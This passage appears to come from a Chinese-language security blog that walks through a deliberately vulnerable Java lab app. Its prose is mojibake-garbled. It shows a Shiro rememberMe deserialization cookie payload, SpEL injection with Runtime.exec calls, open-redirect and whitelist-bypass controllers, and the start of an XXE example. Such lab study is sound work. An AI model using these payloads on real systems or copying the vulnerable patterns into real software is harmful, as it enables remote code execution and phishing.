class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p>å‘é€ cookie è¯·æ±‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: <br>rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span class="hljs-number">8</span>ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M<span class="hljs-regexp">/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/</span>fgg<span class="hljs-regexp">/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/</span>o2X0cKdGWLrUx5SArOLo5tf7LnUF716la<span class="hljs-regexp">/EnO/</span>sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR<span class="hljs-regexp">/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/</span>M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi<span class="hljs-regexp">/0haRw/</span>emevd<span class="hljs-regexp">/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/</span>YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS<span class="hljs-regexp">/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/</span>R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu<span class="hljs-regexp">/1IlrSbwLp/</span>lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+<span class="hljs-number">3</span>sxqRYjWucGEnVn8zKdUG<span class="hljs-regexp">/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/</span><span class="hljs-number">4</span>ewrWv6wK3vIZ1S7SecN8Ff7Kg<span class="hljs-regexp">/mNVnAKFNVU/</span><span class="hljs-number">4</span>YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT<span class="hljs-regexp">/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/</span><span class="hljs-number">4</span>ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX<span class="hljs-regexp">/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/</span>vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q<span class="hljs-regexp">/bW/</span><span class="hljs-number">1</span>nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t<span class="hljs-regexp">/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/</span>Y<span class="hljs-regexp">/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/y</span>dV1Y3q8Jt5Q2KslxZkyF5gR94O3<span class="hljs-regexp">/46aqAXSCxyoxT3Sh/</span>SFZ+wEOcI<span class="hljs-regexp">/XOqGrg9J82FnTBCvVOOvtV3mF0KC/</span>p3TD8ARmpy1xE+<span class="hljs-number">1</span>kt9C+CjYL+QAS<span class="hljs-regexp">/G/</span>AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942029.png" alt="20250726132755476"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942947.png" alt="20250726133031514"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942394.png" alt="20250726133042646"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942506.png" alt="20250726133057346"></p><h2 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h2><blockquote><p>Spring Expression Language æ˜¯ä¸€ç§è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒè¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼ŒåŒæ—¶ä¹Ÿæœ‰æ–¹æ³•è°ƒç”¨å’Œå­—ç¬¦ä¸²æ¨¡æ¿åŠŸèƒ½</p><p>SpELä½¿ç”¨ <code>#{...}</code> ä½œä¸ºå®šç•Œç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯ SpELè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ä»¥åŠå¼•ç”¨beanï¼Œå±æ€§å’Œæ–¹æ³•å¦‚ï¼š</p><blockquote><p>å¼•ç”¨å…¶ä»–å¯¹è±¡:<code>#{car}</code><br>å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š<code>#{car.brand}</code><br>è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š<code>#{car.toString()}</code></p></blockquote><p>1.ç±»ç±»å‹è¡¨è¾¾å¼</p><p>ä½¿ç”¨<code>T()</code>è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„é™æ€å±æ€§æˆ–é™æ€æ–¹æ³•ï¼ŒSpELå†…ç½®äº†<code>java.lang</code>åŒ…ä¸‹çš„ç±»å£°æ˜ï¼Œä¹Ÿå°±æ˜¯è¯´<code>java.lang.String</code>å¯ä»¥é€šè¿‡<code>T(String)</code>è®¿é—®ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨å…¨é™å®šå<br>æ¯”å¦‚ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(Runtime)</span></span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(\<span class="hljs-string">&quot;open /Applications/Calculator.app\&quot;)</span><br></code></pre></td></tr></table></figure><p>2.ç±»å®ä¾‹åŒ–<br>ä½¿ç”¨newå¯ä»¥ç›´æ¥åœ¨SpELä¸­åˆ›å»ºå®ä¾‹ï¼Œéœ€è¦åˆ›å»ºå®ä¾‹çš„ç±»è¦é€šè¿‡å…¨é™å®šåè¿›è¡Œè®¿é—®ã€‚<br>æ¯”å¦‚</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">new</span> java.util.<span class="hljs-built_in">Date</span>()<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln1</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-keyword">return</span> parser.parseExpression(value).getValue().toString();<br>&#125;<br><br><br><span class="hljs-meta">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel_vuln2</span><span class="hljs-params">(String value)</span> &#123;<br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(value, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>());<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> expression.getValue(context);    <span class="hljs-comment">// trigger vulnerability point</span><br>    <span class="hljs-keyword">return</span> x.toString();   <span class="hljs-comment">// response</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>-&gt; http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(%<span class="hljs-number">27</span>calc%<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942808.png" alt="20250726134132360"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=$&#123;T(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br>-&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=<span class="hljs-variable">%2</span>4<span class="hljs-variable">%7BT</span>(java.lang.Runtime.getRuntime().exec(<span class="hljs-variable">%2</span>7calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7D</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942479.png" alt="20250726133936240"></p><h2 id="URLRedirect"><a href="#URLRedirect" class="headerlink" title="URLRedirect"></a>URLRedirect</h2><p>urlé‡å®šå‘æ¼æ´ä¸»è¦ç”¨æ¥é’“é±¼ï¼Œé‡å®šå‘è·³è½¬ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç›´æ¥æ‹¼æ¥ url </span><br><span class="hljs-meta">@GetMapping(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url;<br>&#125;<br><br><span class="hljs-comment">//è®¾ç½®ä»»æ„é‡å®šå‘å¤´ï¼Œæ‰‹åŠ¨è®¾ç½® Location å“åº”å¤´</span><br><span class="hljs-meta">@RequestMapping(&quot;/setHeader&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="hljs-comment">// 301 redirect</span><br>        response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url);<br>    &#125;<br><br><span class="hljs-comment">//ç”¨æˆ·æ§åˆ¶è·³è½¬ç›®æ ‡ã€‚è‡ªåŠ¨è®¾ç½®çŠ¶æ€ç ä¸º 302 å¹¶å†™å…¥ Location å¤´</span><br><span class="hljs-meta">@RequestMapping(&quot;/sendRedirect&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.sendRedirect(url); <span class="hljs-comment">// 302 redirect</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">//u</span>rlRedirect<span class="hljs-regexp">/redirect?url=http:/</span>/www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943493.png" alt="20250726134558956"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943956.png" alt="20250726134611955"></p><h2 id="URLWhiteList"><a href="#URLWhiteList" class="headerlink" title="URLWhiteList"></a>URLWhiteList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/url_bypass&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">url_bypass</span><span class="hljs-params">(String url, HttpServletResponse res)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    logger.info(<span class="hljs-string">&quot;url:  &quot;</span> + url);<br><br>    <span class="hljs-comment">//æ£€æŸ¥ url æ˜¯å¦æ˜¯ä»¥ http:// æˆ– https:// å¼€å¤´</span><br>    <span class="hljs-keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>    <span class="hljs-comment">//ä» URL å¯¹è±¡ä¸­è·å–åŸŸåéƒ¨åˆ†</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    logger.info(<span class="hljs-string">&quot;host:  &quot;</span> + host);<br><br>    <span class="hljs-comment">//éå†é…ç½®çš„åŸŸåç™½åå• domainwhitelist</span><br>    <span class="hljs-comment">// endsWith .</span><br>    <span class="hljs-keyword">for</span> (String domain : domainwhitelist) &#123;<br>        <span class="hljs-keyword">if</span> (host.endsWith(<span class="hljs-string">&quot;.&quot;</span> + domain)) &#123;<br>            res.sendRedirect(url);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ª Java æ ‡å‡†åº“çš„ <code>URL</code> å¯¹è±¡ï¼Œç”¨äºè§£æ <code>url</code> å­—ç¬¦ä¸²çš„ç»“æ„ã€‚</li><li>æ¯”å¦‚ï¼š<br> <code>url = &quot;https://www.example.com:8080/path?q=1&quot;</code><br> åˆ™ï¼š<ul><li><code>u.getHost()</code> &#x3D; <code>&quot;www.example.com&quot;</code></li><li><code>u.getPort()</code> &#x3D; <code>8080</code></li><li><code>u.getPath()</code> &#x3D; <code>&quot;/path&quot;</code></li></ul></li></ul><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><blockquote><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚<br>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p></blockquote><h3 id="1-xmlReader-vuln"><a href="#1-xmlReader-vuln" class="headerlink" title="1.&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xmlReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        